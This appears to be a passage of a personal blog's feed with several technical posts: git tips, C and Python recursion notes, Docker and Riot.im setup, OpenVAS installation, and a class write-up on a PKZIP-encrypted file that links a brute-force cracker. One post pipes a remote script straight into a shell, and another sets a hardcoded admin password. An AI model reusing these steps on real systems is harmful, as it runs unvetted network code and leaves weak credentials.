      <content type="html"><![CDATA[<h1 id="Git-PR-Specific-Single-Commit"><a href="#Git-PR-Specific-Single-Commit" class="headerlink" title="Git PR Specific Single Commit"></a>Git PR Specific Single Commit</h1><p>$ git fetch –all<br>$ git checkout -b my-single-change upstream/master<br>$ git cherry-pick b50b2e7<br>$ git push -u origin my-single-change</p><h1 id="Git-Single-Commit-Patch"><a href="#Git-Single-Commit-Patch" class="headerlink" title="Git Single Commit Patch"></a>Git Single Commit Patch</h1><p>git checkout <detached head="" sha1=""><br>git format-patch -1 HEAD &gt; ./<patch file=""><br>patch -p1 &lt; ./<patch file=""></patch></patch></detached></p><h1 id="Git-Merge-Conflict-Solve"><a href="#Git-Merge-Conflict-Solve" class="headerlink" title="Git Merge Conflict Solve"></a>Git Merge Conflict Solve</h1><p><a href="https://stackoverflow.com/questions/161813/how-to-resolve-merge-conflicts-in-git" target="_blank" rel="noopener">https://stackoverflow.com/questions/161813/how-to-resolve-merge-conflicts-in-git</a><br><a href="http://www.cnblogs.com/sinojelly/archive/2011/08/07/2130172.html" target="_blank" rel="noopener">http://www.cnblogs.com/sinojelly/archive/2011/08/07/2130172.html</a></p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>高等数学 : 等价无穷小量的代换与应用浅谈</title>
      <link href="/2017/AdvMath-Equal-InfiniteSmall/"/>
      <url>/2017/AdvMath-Equal-InfiniteSmall/</url>
      <content type="html"><![CDATA[<p><a href="http://www.ivy-end.com/archives/1567" target="_blank" rel="noopener">http://www.ivy-end.com/archives/1567</a><br><a href="https://zh.wikipedia.org/wiki/%E6%B3%B0%E5%8B%92%E5%85%AC%E5%BC%8F" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/%E6%B3%B0%E5%8B%92%E5%85%AC%E5%BC%8F</a></p>]]></content>
      
      
        <tags>
            
            <tag> School </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>C Programming Notes</title>
      <link href="/2017/C-Programming-Notes/"/>
      <url>/2017/C-Programming-Notes/</url>
      <content type="html"><![CDATA[<h1 id="Define-a-string-var-using-char"><a href="#Define-a-string-var-using-char" class="headerlink" title="Define a string var using char."></a>Define a string var using char.</h1><p>In C , string var is not like the python.<br>You have to declare it first , then make a pointer to the exact string.</p><p>Ref1 : <a href="https://stackoverflow.com/questions/8732325/how-to-declare-strings-in-c" target="_blank" rel="noopener">https://stackoverflow.com/questions/8732325/how-to-declare-strings-in-c</a><br>Ref2 : <a href="https://stackoverflow.com/questions/4337217/difference-between-signed-unsigned-char" target="_blank" rel="noopener">https://stackoverflow.com/questions/4337217/difference-between-signed-unsigned-char</a><br>Ref3 : <a href="https://stackoverflow.com/questions/3862842/difference-between-char-str-string-and-char-str-string" target="_blank" rel="noopener">https://stackoverflow.com/questions/3862842/difference-between-char-str-string-and-char-str-string</a></p><p>At the end of each string , the system will add “\0” at the end. You could use <code>sizeof()</code> func to show its length.</p><p>Example Code:  see practice_c2.c</p><p>Use %s to fill the blank instead of %c , otherwise you will get an error notification from both the compiler and the Clion IDE.</p><h1 id="Other-things"><a href="#Other-things" class="headerlink" title="Other things"></a>Other things</h1><p>For more details , plz see <a href="https://github.com/kmahyyg/learn_cprimer_plus" target="_blank" rel="noopener">https://github.com/kmahyyg/learn_cprimer_plus</a><br>All related notes are placed there in order to sync with the cloud convenniently.</p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>Installation and Configure of Riot.im Server</title>
      <link href="/2017/Installation-and-Configure-of-Riot-im-Server/"/>
      <url>/2017/Installation-and-Configure-of-Riot-im-Server/</url>
      <content type="html"><![CDATA[<h1 id="Before-Installation"><a href="#Before-Installation" class="headerlink" title="Before Installation"></a>Before Installation</h1><p>Preparation: Ubuntu 16.04 LTS with High-speed network connected</p><p>Because of fucking Later Beta Server , I finally decided to use DOCKER image to help me simplify my work.</p><h1 id="Docker-Set-Up"><a href="#Docker-Set-Up" class="headerlink" title="Docker Set-Up"></a>Docker Set-Up</h1><p>Firstly , REF: <a href="https://docs.docker.com/engine/installation/linux/docker-ce/ubuntu/#prerequisites" target="_blank" rel="noopener">https://docs.docker.com/engine/installation/linux/docker-ce/ubuntu/#prerequisites</a> to install docker.</p><p>sudo apt-get remove docker docker-engine docker.io -y<br>sudo apt-get update -y<br>sudo apt-get upgrade -y<br>sudo apt-get dist-upgrade -y<br>sudo apt-get install apt-transport-https ca-certificates curl software-properties-common -y<br>curl -fsSL <a href="https://download.docker.com/linux/ubuntu/gpg" target="_blank" rel="noopener">https://download.docker.com/linux/ubuntu/gpg</a> | sudo apt-key add -<br>sudo apt-key fingerprint 0EBFCD88<br>sudo add-apt-repository \<br>   “deb [arch=amd64] <a href="https://download.docker.com/linux/ubuntu" target="_blank" rel="noopener">https://download.docker.com/linux/ubuntu</a> \<br>   $(lsb_release -cs) \<br>   stable”<br>sudo apt-get update<br>sudo apt-get install docker-ce -y<br>curl -sSL <a href="https://get.daocloud.io/daotools/set_mirror.sh" target="_blank" rel="noopener">https://get.daocloud.io/daotools/set_mirror.sh</a> | sh -s <a href="http://eeae51ae.m.daocloud.io" target="_blank" rel="noopener">http://eeae51ae.m.daocloud.io</a><br>sudo docker run hello-world</p><h1 id="Docker-Hub-Inside-the"><a href="#Docker-Hub-Inside-the" class="headerlink" title="Docker Hub Inside the"></a>Docker Hub Inside the</h1><p><a href="https://www.daocloud.io/mirror#" target="_blank" rel="noopener">https://www.daocloud.io/mirror#</a></p><h1 id="Pull-from-official-docker"><a href="#Pull-from-official-docker" class="headerlink" title="Pull from official docker"></a>Pull from official docker</h1><h2 id="Riot-im-Matrix-Synapse-Server"><a href="#Riot-im-Matrix-Synapse-Server" class="headerlink" title="Riot.im Matrix-Synapse Server"></a>Riot.im Matrix-Synapse Server</h2><p> <strong>Please run all commands under root permission.</strong></p><p><a href="https://www.upcloud.com/support/install-matrix-synapse/" target="_blank" rel="noopener">https://www.upcloud.com/support/install-matrix-synapse/</a><br><a href="https://github.com/matrix-org/synapse" target="_blank" rel="noopener">https://github.com/matrix-org/synapse</a></p><p>Check Here and Follow Github Readme to build it from source yourself, otherwise some commands must be wrong.</p><h2 id="Riot-im-Web-APP"><a href="#Riot-im-Web-APP" class="headerlink" title="Riot.im Web APP"></a>Riot.im Web APP</h2><p>docker pull silviof/matrix-riot-docker</p><blockquote><p>-p 8765<br>-A 0.0.0.0<br>-c 3500<br>–ssl<br>–cert /data/fullchain.pem<br>–key /data/key.pem</p></blockquote><p>echo “ALL THE CONFIG ABOVE SHOULD BE PUT HERE” &gt; /dockerconf/riotweb/riot.im.conf</p><p>docker run -d -p 8765:8765 -v /tmp/data:/data silviof/matrix-riot-docker</p><h2 id="Riot-im-Cross-Platform"><a href="#Riot-im-Cross-Platform" class="headerlink" title="Riot.im Cross-Platform"></a>Riot.im Cross-Platform</h2><p>Find them at App Store for iOS , Play Store for Android , go to <a href="https://riot.im" target="_blank" rel="noopener">https://riot.im</a> for PC or use the web app.</p><h2 id="Future-optimization"><a href="#Future-optimization" class="headerlink" title="Future optimization"></a>Future optimization</h2><ol><li>Strongly suggest that you should not put the server and web client in the same server to prevent XSS attack.</li><li>Strongly suggest that you should use Let’s Encrypt Trusted CA certificates to replace the self-signed one.</li><li>Please consider auto add port forward in docker run command , something in official dockerfile readme is missing.</li></ol><h1 id="Enjoy-it"><a href="#Enjoy-it" class="headerlink" title="Enjoy it!"></a>Enjoy it!</h1>]]></content>
      
      
    </entry>
    
    <entry>
      <title>CI of Hexo Blog</title>
      <link href="/2017/CI-of-Hexo-Blog/"/>
      <url>/2017/CI-of-Hexo-Blog/</url>
      <content type="html"><![CDATA[<h1 id="Pre-configure"><a href="#Pre-configure" class="headerlink" title="Pre-configure"></a>Pre-configure</h1><p>Set Personal Access Tokens for accessing your repo with write access and so that the push operation won’t need you to use SSH keys.</p><h1 id="Deploy-Settings-in-Hexo-Global-config-yml"><a href="#Deploy-Settings-in-Hexo-Global-config-yml" class="headerlink" title="Deploy Settings in Hexo Global _config.yml"></a>Deploy Settings in Hexo Global _config.yml</h1><p>deploy:<br>  type: git<br>  repo:<br>    github: <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>:kmahyyg/kmahyyg.github.io.git,master<br>    coding: <a href="mailto:git@git.coding.net" target="_blank" rel="noopener">git@git.coding.net</a>:kmahyyg/kmahyyg.git,master</p><h1 id="Refs"><a href="#Refs" class="headerlink" title="Refs"></a>Refs</h1><p><a href="https://blog.nfz.moe/archives/hexo-auto-deploy-with-travis-ci.html" target="_blank" rel="noopener">https://blog.nfz.moe/archives/hexo-auto-deploy-with-travis-ci.html</a></p><p><a href="http://docs.flow.ci/zh/" target="_blank" rel="noopener">http://docs.flow.ci/zh/</a></p><p><a href="https://huangyijie.com/2017/06/22/blog-with-github-travis-ci-and-coding-net-3/" target="_blank" rel="noopener">https://huangyijie.com/2017/06/22/blog-with-github-travis-ci-and-coding-net-3/</a></p><p><a href="https://docs.travis-ci.com/user/encrypting-files/#Automated-Encryption" target="_blank" rel="noopener">https://docs.travis-ci.com/user/encrypting-files/#Automated-Encryption</a></p><p><a href="https://huangyijie.com/2016/09/20/blog-with-github-travis-ci-and-coding-net-1/" target="_blank" rel="noopener">https://huangyijie.com/2016/09/20/blog-with-github-travis-ci-and-coding-net-1/</a></p><p><a href="https://github.com/kmahyyg/kmahyyg.github.io/blob/raw/.travis.yml" target="_blank" rel="noopener">https://github.com/kmahyyg/kmahyyg.github.io/blob/raw/.travis.yml</a></p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>Installation of OpenVAS</title>
      <link href="/2017/Installation-of-OpenVAS/"/>
      <url>/2017/Installation-of-OpenVAS/</url>
      <content type="html"><![CDATA[<h1 id="Before-Installation"><a href="#Before-Installation" class="headerlink" title="Before Installation"></a>Before Installation</h1><h3 id="Change-APT-Repository"><a href="#Change-APT-Repository" class="headerlink" title="Change APT Repository"></a>Change APT Repository</h3><p><code>sudo apt-get update -y</code><br><code>sudo vi /etc/apt/sources.list</code><br><code>sudo echo &quot;113.55.12.55 mirrors.ynuosa.org&quot; &gt;&gt; /etc/hosts</code><br><code>:% s/cn.archive.ubuntu.com/mirrors.ynuosa.org</code><br><code>:wq</code></p><h3 id="Add-Kali-Repository-and-Install-Software"><a href="#Add-Kali-Repository-and-Install-Software" class="headerlink" title="Add Kali Repository and Install Software"></a>Add Kali Repository and Install Software</h3><p>sudo wget -qO- <a href="https://www.kali.org/archive-key.asc" target="_blank" rel="noopener">https://www.kali.org/archive-key.asc</a> | sudo apt-key add -<br>sudo echo “deb <a href="http://mirrors.ynuosa.org/kali" target="_blank" rel="noopener">http://mirrors.ynuosa.org/kali</a> kali-rolling main contrib non-free” &gt; /etc/apt/sources.list<br>sudo add-apt-repository ppa:mrazavi/openvas<br>sudo apt-get update -y<br>sudo su<br>apt-get update -y<br>apt-get install openvas libopenvas9 libopenvas9-dev greenbone-security-assistant sqlite3 -y</p><h1 id="After-Installation"><a href="#After-Installation" class="headerlink" title="After Installation"></a>After Installation</h1><p>openvas-setup<br>openvas-check-setup<br>openvas-feed-update<br>openvasmd –user admin –new-password fuCkY0USh!t<br>openvas-stop<br>openvas-start</p><h2 id="Prevent-suddenly-crash"><a href="#Prevent-suddenly-crash" class="headerlink" title="Prevent suddenly crash"></a>Prevent suddenly crash</h2><blockquote><blockquote><pre><code>most likely the known issue where redis is blocking any access by thescanner due to unknown reasons. This should do the trick:1. Delete dump.rdb (somewhere in /var/run/redis or similar)2. Comment out/remove all &quot;save xy z&quot; (e.g. save 900 1) from yourredis.conf3. restart redis4. restart scanner and try again</code></pre></blockquote><p>–</p><p>Christian Fischer | PGP Key: 0x54F3CE5B76C597AD<br>Greenbone Networks GmbH | <a href="http://greenbone.net" target="_blank" rel="noopener">http://greenbone.net</a><br>Neumarkt 12, 49074 Osnabrück, Germany | AG Osnabrück, HR B 202460<br>Geschäftsführer: Lukas Grunwald, Dr. Jan-Oliver Wagner</p></blockquote>]]></content>
      
      
    </entry>
    
    <entry>
      <title>A process to crack a encrypted PKZIP 2.0 file</title>
      <link href="/2017/A-process-to-crack-a-encrypted-PKZIP-2-0-file/"/>
      <url>/2017/A-process-to-crack-a-encrypted-PKZIP-2-0-file/</url>
      <content type="html"><![CDATA[<h1 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h1><p>开学前看到班群里发了任务8：破解zip文件密码</p><h1 id="任务内容"><a href="#任务内容" class="headerlink" title="任务内容"></a>任务内容</h1><blockquote><p>任务八：走进安全</p><ul><li>破解离散数学2015年加密期中文件的口令<br>参考资料1: <a href="https://zh.wikipedia.org/wiki/%E5%AF%86%E7%A0%81%E5%88%86%E6%9E%90" target="_blank" rel="noopener">密码分析</a><br>—————— <em>这个是我自己加的，原本任务内容没有</em> —————–<br>参考资料2: <a href="https://pkware.cachefly.net/webdocs/casestudies/APPNOTE.TXT" target="_blank" rel="noopener">Pkzip官方文件头描述文档</a><br>参考资料3: <a href="https://users.cs.jmu.edu/buchhofp/forensics/formats/pkzip.html" target="_blank" rel="noopener">Pkzip文件架构分析</a><br>参考资料4: <a href="https://eprint.iacr.org/2004/078.pdf" target="_blank" rel="noopener">zip加密算法分析1</a><br>参考资料5: <a href="https://courses.cs.ut.ee/MTAT.07.022/2015_fall/uploads/Main/dmitri-report-f15-16.pdf" target="_blank" rel="noopener">zip加密算法分析2</a><br>参考资料6: <a href="https://www.cs.auckland.ac.nz/~mike/zipattacks.pdf" target="_blank" rel="noopener">pkzip传统加密算法的无密文破解分析</a><br>—————— <em>这个是我自己加的，原本任务内容没有</em> —————–</li></ul><p>可选：<br>1.破解离散数学2015年加密期末文件的口令<br>2.了解压缩文件使用的加密算法</p></blockquote><h1 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h1><h2 id="分析HEADER，明确加密算法"><a href="#分析HEADER，明确加密算法" class="headerlink" title="分析HEADER，明确加密算法"></a>分析HEADER，明确加密算法</h2><p>老样子，Total Commander，使用内置Lister以hex形式打开加密后的文件。<br>看到：</p><blockquote><p>00000000   504b 0304 1400 0100 0800 6d51 6647 03ae</p></blockquote><p>查看参考资料2，得知文件头的格式如下：</p><blockquote><p>   4.3.6 Overall .ZIP file format:</p><pre><code> [local file header 1] [encryption header 1] [file data 1] [data descriptor 1] .  . . [local file header n] [encryption header n] [file data n] [data descriptor n] [archive decryption header]  [archive extra data record]  [central directory header 1] . . . [central directory header n] [zip64 end of central directory record] [zip64 end of central directory locator]  [end of central directory record]</code></pre></blockquote><p>分析：</p><p><img src="https://yygc.zzjnyyz.cn/asset_files/pkzip1.png" alt="local-file-header.png"></p><p>0x04034b50 (Must read in little-endian)   定义为文件头标签，即让OS知道这是个zip文件     </p><blockquote><pre><code> 文档4.3.7部分 local file header signature     4 bytes  (0x04034b50) version needed to extract       2 bytes general purpose bit flag        2 bytes</code></pre></blockquote><p>0x00010014</p><p>由参考资料2可知，0x0014为最低的解压软件版本(20)，即至少需要 PKzip 2.0可以解压。<br>0x0001表示这是一个加密过的压缩文件。</p><h3 id="可选任务2-，看到这也就顺手完成了。"><a href="#可选任务2-，看到这也就顺手完成了。" class="headerlink" title="可选任务2 ，看到这也就顺手完成了。"></a>可选任务2 ，看到这也就顺手完成了。</h3><blockquote><p>参考资料2 4.4.3.2<br> 1.0 - Default value<br>   1.1 - File is a volume label<br>   2.0 - File is a folder (directory)<br>   2.0 - File is compressed using Deflate compression<br>   2.0 - File is encrypted using traditional PKWARE encryption<br>   2.1 - File is compressed using Deflate64(tm)<br>   2.5 - File is compressed using PKWARE DCL Implode<br>   2.7 - File is a patch data set<br>   4.5 - File uses ZIP64 format extensions<br>   4.6 - File is compressed using BZIP2 compression<em><br>   5.0 - File is encrypted using DES<br>   5.0 - File is encrypted using 3DES<br>   5.0 - File is encrypted using original RC2 encryption<br>   5.0 - File is encrypted using RC4 encryption<br>   5.1 - File is encrypted using AES encryption<br>   5.1 - File is encrypted using corrected RC2 encryption<strong><br>   5.2 - File is encrypted using corrected RC2-64 encryption</strong><br>   6.1 - File is encrypted using non-OAEP key wrapping**</em><br>   6.2 - Central directory encryption<br>   6.3 - File is compressed using LZMA<br>   6.3 - File is compressed using PPMd+<br>   6.3 - File is encrypted using Blowfish<br>   6.3 - File is encrypted using Twofish</p></blockquote><h2 id="回归正题"><a href="#回归正题" class="headerlink" title="回归正题"></a>回归正题</h2><p>由上可知，这个文件最低的解压缩软件要求版本是2.0，也就是说它在1.0 1.1是无法解压的，那么也不可能是过高的版本，知道了它使用了传统的 PKWARE 加密方式。</p><p>鉴于C语言没学，具体的算法和思路代码自己参看参考资料4吧。<br>无奈了，大概能看懂一些东西，就是crc32 + uint8/16/32 + xor + 伪随机数据流的一个东西。</p><p>好吧，转到Github，看看有没有大神写了crack代码并开源。找到了，然后把它附到了我的站点上，需要的自取。</p><h2 id="bruteforce-cracker"><a href="#bruteforce-cracker" class="headerlink" title="bruteforce cracker"></a>bruteforce cracker</h2><p>Upload some <a href="https://yygc.zzjnyyz.cn/asset_files/zipcracker-bruteforce-real.rar" target="_blank" rel="noopener">brute-force cracker</a> for pkzip.<br>Still Cracking using DO .</p>]]></content>
      
      
        <tags>
            
            <tag> Code </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Python 3 中对递归函数及其经典示例的思考</title>
      <link href="/2017/Py3-Recursive-Function/"/>
      <url>/2017/Py3-Recursive-Function/</url>
      <content type="html"><![CDATA[<h1 id="感谢廖雪峰大神的教程！"><a href="#感谢廖雪峰大神的教程！" class="headerlink" title="感谢廖雪峰大神的教程！"></a>感谢廖雪峰大神的教程！</h1><h1 id="递归-与-尾递归"><a href="#递归-与-尾递归" class="headerlink" title="递归 与 尾递归"></a>递归 与 尾递归</h1><p>  递归是一个过程或函数在其定义或说明中有直接或间接调用自身的一种方法，它通常把一个大型复杂的问题层层转化为一个与原问题相似的规模较小的问题来求解，递归策略只需少量的程序就可描述出解题过程所需要的多次重复计算，大大地减少了程序的代码量。</p><p>  如果一个函数中所有递归形式的调用都出现在函数的末尾，我们称这个递归函数是尾递归的。当递归调用是整个函数体中最后执行的语句且它的返回值不属于表达式的一部分时，这个递归调用就是尾递归。尾递归函数的特点是在回归过程中不用做任何操作，这个特性很重要，因为大多数现代的编译器会利用这种特点自动生成优化的代码。</p><h2 id="递归算法的应用"><a href="#递归算法的应用" class="headerlink" title="递归算法的应用"></a>递归算法的应用</h2><p>  递归算法，在很大程度上减少了代码量，尽可能减少了使用循环时重复判定带来的逻辑不清与出现错误的可能性，可以帮助程序员更专注于思维和程序功能的实验，而并非冗杂的语法逻辑转换。尾递归则在递归算法的基础上进一步优化，在返回时不再涉及运算式，尽可能能地调用原函数代码，利用这个特性，可以提高堆栈利用率，减少出现堆栈溢出的可能。</p><p>  以Python3为例，下同，我们定义一个阶乘函数。</p><pre><code>  def fact1(n):  # equals to n * n-1 * n-2 * .....* 3 * 2 * 1    if n == 1:        return 1    return n * fact1(n - 1)</code></pre><p>  当你输入fact1(100)可能不会有差别，然而当你输入fact1(998)的时候，你就会得到下面的提示（Python本身的限制是1000，这个溢出的界限取决于机器，我的服务器就可以执行fact1(999)，我的笔记本就不行）：</p><blockquote><p>RecursionError: maximum recursion depth exceeded in comparison<br>Process finished with exit code 1</p></blockquote><p>  实际上，我们可以通过写成尾递归的形式对其进行优化：</p><pre><code>def fact2(n):    return  fact2_iter(n,1)def fact2_iter(num,product):    if num == 1 :        return product    return fact2_iter(num - 1 , num * product)</code></pre><p>解决递归调用栈溢出的方法是通过尾递归优化，事实上尾递归和循环的效果是一样的，所以，把循环看成是一种特殊的尾递归函数也是可以的。</p><p>尾递归是指，在函数返回的时候，调用自身本身，并且，return语句不能包含表达式。这样，编译器或者解释器就可以把尾递归做优化，使递归本身无论调用多少次，都只占用一个栈帧，不会出现栈溢出的情况。</p><p>上面的fact(n)函数由于return n * fact(n - 1)引入了乘法表达式，所以就不是尾递归了。要改成尾递归方式，需要多一点代码，主要是要把每一步的乘积传入到递归函数中。</p><blockquote><p><strong>然而，不幸的是，仅有少部分高级语言的解释器对尾递归进行了优化，对于Python3和绝大多数语言解释器而言，尾递归是没有任何优化的。</strong> 尽管如此，为了使你的代码具有更高的资源利用率，我还是建议你写成尾递归的形式。</p></blockquote><h1 id="经典示例"><a href="#经典示例" class="headerlink" title="经典示例"></a>经典示例</h1><h2 id="示例一-：-汉诺塔的递归实验"><a href="#示例一-：-汉诺塔的递归实验" class="headerlink" title="示例一 ： 汉诺塔的递归实验"></a>示例一 ： 汉诺塔的递归实验</h2><h3 id="老样子，先上算法："><a href="#老样子，先上算法：" class="headerlink" title="老样子，先上算法："></a>老样子，先上算法：</h3><pre><code>def move(CircleatA, LocA=&#39;A Pipe&#39;, LocB=&#39;B Pipe&#39;, LocC=&#39;C Pipe&#39;):    if CircleatA == 1:        print(&#39;move&#39;, LocA, &#39;--&gt;&#39;, LocC)    else:        move(CircleatA - 1, LocA, LocC, LocB)        move(1, LocA, LocB, LocC)        move(CircleatA - 1, LocB, LocA, LocC)</code></pre><h3 id="算法与数学分析"><a href="#算法与数学分析" class="headerlink" title="算法与数学分析"></a>算法与数学分析</h3><blockquote><p>参考资料： <a href="https://www.zhihu.com/question/24385418" target="_blank" rel="noopener">https://www.zhihu.com/question/24385418</a></p></blockquote><h4 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h4><p>有A,B,C三根针，将A针上N个从小到大叠放的盘子移动到C针，一次只能移动一个，不重复移动，小盘子必须在大盘子上面。</p><h3 id="0x01-思路"><a href="#0x01-思路" class="headerlink" title="0x01 思路"></a>0x01 思路</h3><blockquote><ol><li>只有经历“移动最大盘子”这个步骤，余下的事情才有可能实现。而在此之前，我们所要做的事情，就是让“移动最大盘子”这个步骤得以实现。现在，游戏整个过程以“移动最大盘子”为中央，被分为了两部分。即（前）“将那坨N-1个盘子从A针移动到B针”，(中)“移动最大盘子”，(后)“将坨N-1个盘子从B针移动到C针”。这是我们意识到，（前）与（后）操作道理是相似的。不去管那个最大盘子，（前）是以C针为中转站，（后）是以A针为中转站。因此两者所需的移动次数应当是相等的。这意味着我们只要计算出其中一者的移动次数，然而乘以2，在加上“移动最大盘子”的那1次，就是这场游戏的总移动次数了。用数学语言表达，假设（前）“将N-1个盘子从A针移动到B针”所需次数为H(n-1)，总移动次数为H(n)，那么可以得出的关系就是：H(n)= H(n-1) x 2 + 1.</li></ol></blockquote><h3 id="0x02-证明最优解"><a href="#0x02-证明最优解" class="headerlink" title="0x02 证明最优解"></a>0x02 证明最优解</h3><blockquote><p>最基本的情况，即n为1，就不用说了。现在F(n-1)确实是把n-1个盘子集体挪动的最小步数，我们要证明F(n)是把n个盘子集体挪动的最小步数。</p></blockquote><blockquote><p>1）在把n个盘子从A移动到C的过程中，必然存在一步，是把最大的盘子从A拿出来。要想把最大的盘子从A移动到别的某个柱子上（B或C），就必须保证剩下的n-1个盘子不能碍事，得好好堆在剩下那个柱子（C或B）上。要保证n-1个盘子都在剩下那个柱子上，至少得付出F(n-1)次移动。</p></blockquote><blockquote><p>2）在把n个盘子从A移动到C的过程中，必然存在一步，是最大的盘子被放到了C上，而且此后再也没动过。在这步实行之前，最大的盘子要么在A要么在B上，而相应地别的n-1个盘子要么在B要么在A上。在这步实施之后，我们只要花至少F(n-1)的步数把n-1个盘子从要么B要么A挪动到C上就行了。这些步数必然和1）中的步数不重叠，因为这时候最大盘子在C上，而1）中最大盘子在A上。</p></blockquote><blockquote><p>3）最大的盘子至少被挪动了一次。而且这一次肯定没被算在1）或2）的“至少F(n-1)步”中，因为后者只挪动较小的那n-1个盘子。把1），2），3）加起来，就是至少F(n-1) + F(n-1) + 1步。不能再少了。</p></blockquote><h3 id="0x03-程序运行简析"><a href="#0x03-程序运行简析" class="headerlink" title="0x03 程序运行简析"></a>0x03 程序运行简析</h3><blockquote><p>首先，你需要先理解n=2的情况，非常简单：<br>n=2时：执行move(1,a,c,b)，打印出A–&gt;B；<br>执行A–&gt;C；<br>执行move(1,b,a,c)，打印出B–&gt;C；<br>因此n=2时，相当于是将A中的两个盘子按照规则搬到了C中。</p></blockquote><blockquote><p>n=3时：执行move(2,a,c,b)，带入我们之前所理解的结果，即将A中的上面2个盘子按照规则搬到了B中，并且打印出过程；<br>将A中最下面的盘子搬到c中，打印A–&gt;C； 执行move(2,b,a,c)，即将B中的2个盘子按规则搬到C中，并且打印出过程。</p></blockquote><blockquote><p><em>n=4时程序基于n=3上运行，一层套一层，这就是递归。</em></p></blockquote><h3 id="0x04-汉诺塔问题的通解"><a href="#0x04-汉诺塔问题的通解" class="headerlink" title="0x04 汉诺塔问题的通解"></a>0x04 汉诺塔问题的通解</h3><blockquote><p>最关键的一个步骤在于最大的盘子是否挪到目标柱子，在最大的盘子挪到目标柱子以后，它将不应在参与移动。<br>　因为剩下的任何盘子都可以移动到最大的盘子上面，于是我们就可以无视掉它。<br>在汉诺塔中，有这样三个步骤简单的说，就是这3步：1. 最大号盘子没有挪动到目标柱子，我们创造机会让它过去（把冰箱门打开）2. 把最大号挪动到目标柱子（把大象装进去）3. 把剩下的盘子挪到最大号盘子上（把冰箱门关上）设起始柱子为A，中介柱子为B，目标柱子为C</p></blockquote><blockquote><p><em>注意，不要落入ABC三个柱子的局限之中，ABC在不同的循环步骤之中，不一定代表起始柱子，中介柱子和目标柱子。最小的盘子为编号1，最大的盘子为编号n</em></p></blockquote><h3 id="0x05-终极之战，函数问题的抽象化"><a href="#0x05-终极之战，函数问题的抽象化" class="headerlink" title="0x05 终极之战，函数问题的抽象化"></a>0x05 终极之战，函数问题的抽象化</h3><p><img src="https://ooo.0o0.ooo/2017/07/02/595907560f6f3.png" alt="9e868e86b16f18d153bff7811e94367a_b.png"></p><p>(a)是初始状态，也就是递归的起点，我们假设n=4， move(4,A,B,C)还是请参考现在最高的分的代码哈~<br>写这个是帮助大家更清楚那个让人压力大的（“抽象”）两个字，哈哈     &lt;这个函数要实现的功能是把n个环从A按照一定的规则，借助B，移动到C&gt;</p><p>(b)是step1完成的时候的状态，已经将所有的n-1,这里也就是3个环从A挪到了B     &lt;第一处递归，move(n-1,A,C,B) 这个函数要实现将n-1个环从A，借助C，移动到B&gt;</p><p>(c)是step2，此时需要将第n个，也就是第四个最大的环从A挪到C      &lt;move(1,A,B,C)，或者干脆直接print(“A -&gt; C”)&gt;</p><p>(d)是step3，此时需要将B上面的n-1个环从B挪到C&lt;第二处递归&gt;     &lt;第二处递归，move(n-1,B,A,C) 这个函数要实现将n-1个环从B，借助A，移动到C&gt;</p><p>代码参见： <a href="https://github.com/kmahyyg/learn_py3" target="_blank" rel="noopener">https://github.com/kmahyyg/learn_py3</a></p><h2 id="示例2-：-斐波那契数列"><a href="#示例2-：-斐波那契数列" class="headerlink" title="示例2 ： 斐波那契数列"></a>示例2 ： 斐波那契数列</h2><p>请直接参考C语言实现。</p>]]></content>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Relearn - Migrate from Python2.7 to Python3.5</title>
      <link href="/2017/Relearn-Py27_to_Py36/"/>
      <url>/2017/Relearn-Py27_to_Py36/</url>
      <content type="html"><![CDATA[<h1 id="Part-1-Introduction"><a href="#Part-1-Introduction" class="headerlink" title="Part 1 : Introduction"></a>Part 1 : Introduction</h1><p>In Python 3.5 , print() now regard as a function seriously , so if you want to print something ,<br>donnot forget to add brackets and quotes.</p><h1 id="Part-2-Base"><a href="#Part-2-Base" class="headerlink" title="Part 2 : Base"></a>Part 2 : Base</h1><h2 id="2-1-Data-Type"><a href="#2-1-Data-Type" class="headerlink" title="2-1 : Data Type"></a>2-1 : Data Type</h2><h3 id="Transcript-Type"><a href="#Transcript-Type" class="headerlink" title="Transcript - Type"></a>Transcript - Type</h3><p>转义字符\可以转义很多字符，比如\n表示换行，\t表示制表符，字符\本身也要转义，所以\表示的字符就是\，可以在Python的交互式命令行用print()打印字符串看看.</p><p>如果字符串里面有很多字符都需要转义，就需要加很多\，为了简化，Python还允许用r’’表示’’内部的字符串默认不转义，可以自己试试：</p><p>如果字符串内部有很多换行，用\n写在一行里不好阅读，为了简化，Python允许用’’’…’’’的格式表示多行内容，可以自己试试：</p><blockquote><p>print(‘’’line1<br>line2<br>line3’’’)</p></blockquote><p>其他的 请 参阅 我的 Github(“<a href="https://github.com/kmahyyg/learn_py3&quot;" target="_blank" rel="noopener">https://github.com/kmahyyg/learn_py3&quot;</a>) 代码注释</p><h2 id="Argument-in-function-and-recursive-function"><a href="#Argument-in-function-and-recursive-function" class="headerlink" title="Argument in function and recursive function"></a>Argument in function and recursive function</h2><h3 id="默认参数必须指向不变对象！"><a href="#默认参数必须指向不变对象！" class="headerlink" title="默认参数必须指向不变对象！"></a>默认参数必须指向不变对象！</h3><h3 id="Args-in-a-func"><a href="#Args-in-a-func" class="headerlink" title="Args in a func"></a>Args in a func</h3><p>函数参数设定必须遵循顺序：必选参数、默认参数、可变参数、命名关键字参数和关键字参数。必选参数、默认参数、可变参数、命名关键字参数和关键字参数。</p><h3 id="Recursive-Func"><a href="#Recursive-Func" class="headerlink" title="Recursive Func"></a>Recursive Func</h3><p> 递归函数：</p><figcaption>fact(n):</figcaption><pre class="line-numbers language-def"><code class="language-def">        if n == 1 :            return 1        return n * fact(n-1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>但对于上述递归函数，如果输入1000，   ··· RuntimeError: maximum recursion depth exceeded in comparison 